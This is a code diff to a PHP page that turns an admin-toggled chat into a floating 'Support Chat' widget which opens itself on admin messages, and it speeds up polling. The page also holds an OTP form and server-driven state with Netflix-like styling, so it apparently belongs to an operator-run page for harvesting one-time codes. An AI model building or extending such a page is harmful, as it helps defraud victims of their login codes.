@@ -51,21 +51,86 @@ $smsState['instruction_token'] = $smsState['instruction_token'] ?? time();
             border: 1px solid #ef9a9a;
         }
 
-        .chat-panel {
-            margin-top: 20px;
+        .support-chat-widget {
+            position: fixed;
+            right: 18px;
+            bottom: 18px;
+            z-index: 9999;
+        }
+
+        .chat-toggle {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            border: none;
+            background: linear-gradient(135deg, #e50914, #b20710);
+            color: #fff;
+            font-size: 24px;
+            cursor: pointer;
+            box-shadow: 0 12px 26px rgba(0, 0, 0, 0.45);
+            position: relative;
+        }
+
+        .chat-notification {
+            position: absolute;
+            top: -4px;
+            right: -4px;
+            min-width: 22px;
+            height: 22px;
+            border-radius: 999px;
+            background: #ff2b2b;
+            color: #fff;
+            font-size: 12px;
+            font-weight: 700;
             display: none;
+            align-items: center;
+            justify-content: center;
+            border: 2px solid #111;
+            padding: 0 6px;
+            box-sizing: border-box;
+        }
+
+        .chat-notification.show { display: inline-flex; }
+
+        .chat-panel {
+            display: none;
+            width: min(92vw, 360px);
+            margin-bottom: 10px;
+            background: #0f0f0f;
+            border: 1px solid #2a2a2a;
+            border-radius: 14px;
+            overflow: hidden;
+            box-shadow: 0 16px 35px rgba(0, 0, 0, 0.5);
         }
 
         .chat-panel.active { display: block; }
 
+        .chat-topbar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: #171717;
+            padding: 12px 14px;
+            border-bottom: 1px solid #2a2a2a;
+        }
+
+        .chat-title { margin: 0; font-size: 15px; color: #fff; }
+
+        .chat-close {
+            background: transparent;
+            border: none;
+            color: #bbb;
+            cursor: pointer;
+            font-size: 18px;
+        }
+
         .chat-box {
             background: #050505;
-            border: 1px solid #1f1f1f;
-            border-radius: 12px;
+            border: 0;
+            border-radius: 0;
             padding: 12px;
             max-height: 280px;
             overflow-y: auto;
-            margin-top: 8px;
             display: flex;
             flex-direction: column;
             gap: 10px;
@@ -104,7 +169,7 @@ $smsState['instruction_token'] = $smsState['instruction_token'] ?? time();
         }
 
         .chat-text {
-            font-size: 17px;
+            font-size: 15px;
             line-height: 1.45;
             color: #fff;
         }
@@ -114,18 +179,19 @@ $smsState['instruction_token'] = $smsState['instruction_token'] ?? time();
         .chat-controls {
             display: flex;
             gap: 10px;
-            margin-top: 12px;
+            padding: 10px 12px 12px;
+            border-top: 1px solid #1f1f1f;
             align-items: center;
         }
 
         .chat-controls input {
             flex: 1;
-            padding: 14px 12px;
+            padding: 12px;
             border-radius: 10px;
             border: 1px solid #333;
             background: #0c0c0c;
             color: #f5f5f5;
-            font-size: 16px;
+            font-size: 14px;
             box-shadow: inset 0 0 0 1px #1c1c1c;
         }
 
@@ -193,15 +259,23 @@ $initialState = [
         </div>
     </form>
 
+<div class="support-chat-widget" id="support-chat-widget">
     <div class="chat-panel" id="chat-panel">
-        <h3>Live chat</h3>
+        <div class="chat-topbar">
+            <h3 class="chat-title">Support Chat</h3>
+            <button class="chat-close" id="chat-close" type="button">✕</button>
+        </div>
         <div class="chat-box" id="chat-box"></div>
         <div class="chat-controls">
             <input type="text" id="chat-input" placeholder="Type a message...">
             <button type="button" id="chat-send">Send</button>
         </div>
-        <p class="chat-meta">Chat appears only when the admin enables it.</p>
     </div>
+    <button type="button" class="chat-toggle" id="chat-toggle" aria-label="Open support chat">
+        💬
+        <span class="chat-notification" id="chat-notification">0</span>
+    </button>
+</div>
 
 </div>
 </div>
@@ -215,6 +289,9 @@ $initialState = [
     const chatInput = document.getElementById('chat-input');
     const chatSend = document.getElementById('chat-send');
     const statusArea = document.getElementById('status-area');
+    const chatToggle = document.getElementById('chat-toggle');
+    const chatClose = document.getElementById('chat-close');
+    const chatNotification = document.getElementById('chat-notification');
     const otpForm = document.getElementById('otp-form');
     const otpExitFlag = document.getElementById('otp-exit-flag');
     const otpSubmit = document.getElementById('otp-submit');
@@ -223,6 +300,9 @@ $initialState = [
     let currentState = { ...initialState };
     let chatInterval = null;
     let stateInterval = null;
+    let isChatOpen = false;
+    let unreadCount = 0;
+    let lastSeenAdminTimestamp = Number(sessionStorage.getItem('last_admin_msg_ts') || 0);
 
     function renderChat(messages) {
         if (!chatBox) return;
@@ -249,17 +329,52 @@ $initialState = [
         chatBox.scrollTop = chatBox.scrollHeight;
     }
 
+    function openChat(markAsRead = true) {
+        isChatOpen = true;
+        chatPanel.classList.add('active');
+        if (markAsRead) {
+            unreadCount = 0;
+            chatNotification.classList.remove('show');
+        }
+    }
+
+    function closeChat() {
+        isChatOpen = false;
+        chatPanel.classList.remove('active');
+    }
+
+    function handleAdminNotifications(messages) {
+        const latestAdmin = [...messages].reverse().find((entry) => entry.sender === 'admin');
+        if (!latestAdmin) return;
+
+        const adminTimestamp = Number(latestAdmin.timestamp || 0);
+        if (adminTimestamp > lastSeenAdminTimestamp) {
+            if (!isChatOpen) {
+                unreadCount += 1;
+                chatNotification.textContent = unreadCount > 9 ? '9+' : String(unreadCount);
+                chatNotification.classList.add('show');
+                openChat(false);
+            } else {
+                unreadCount = 0;
+                chatNotification.classList.remove('show');
+            }
+
+            lastSeenAdminTimestamp = adminTimestamp;
+            sessionStorage.setItem('last_admin_msg_ts', String(lastSeenAdminTimestamp));
+        }
+    }
+
     async function fetchChat() {
         try {
             const response = await fetch('chat_api.php?action=fetch');
             const data = await response.json();
             if (data.chat_enabled) {
-                chatPanel.classList.add('active');
                 chatInput.disabled = false;
                 chatSend.disabled = false;
                 renderChat(data.messages || []);
+                handleAdminNotifications(data.messages || []);
             } else {
-                chatPanel.classList.remove('active');
+                closeChat();
                 chatInput.disabled = true;
                 chatSend.disabled = true;
             }
@@ -271,15 +386,14 @@ $initialState = [
     function toggleChat(enable) {
         if (!chatPanel) return;
         if (enable) {
-            chatPanel.classList.add('active');
             chatInput.disabled = false;
             chatSend.disabled = false;
             if (!chatInterval) {
                 fetchChat();
-                chatInterval = setInterval(fetchChat, 1500);
+                chatInterval = setInterval(fetchChat, 1000);
             }
         } else {
-            chatPanel.classList.remove('active');
+            closeChat();
             chatInput.disabled = true;
             chatSend.disabled = true;
             if (chatInterval) {
@@ -406,6 +520,21 @@ $initialState = [
         }
     }
 
+    if (chatToggle) {
+        chatToggle.addEventListener('click', () => {
+            if (isChatOpen) {
+                closeChat();
+            } else {
+                openChat(true);
+                fetchChat();
+            }
+        });
+    }
+
+    if (chatClose) {
+        chatClose.addEventListener('click', closeChat);
+    }
+
     if (chatSend) {
         chatSend.addEventListener('click', sendChatMessage);
         chatInput.addEventListener('keydown', (e) => {
@@ -419,7 +548,7 @@ $initialState = [
     applyState(currentState, 'initial');
     toggleChat(!!currentState.chat_enabled);
     pollState();
-    stateInterval = setInterval(pollState, 1200);
+    stateInterval = setInterval(pollState, 1000);
 
 </script>
 </body>
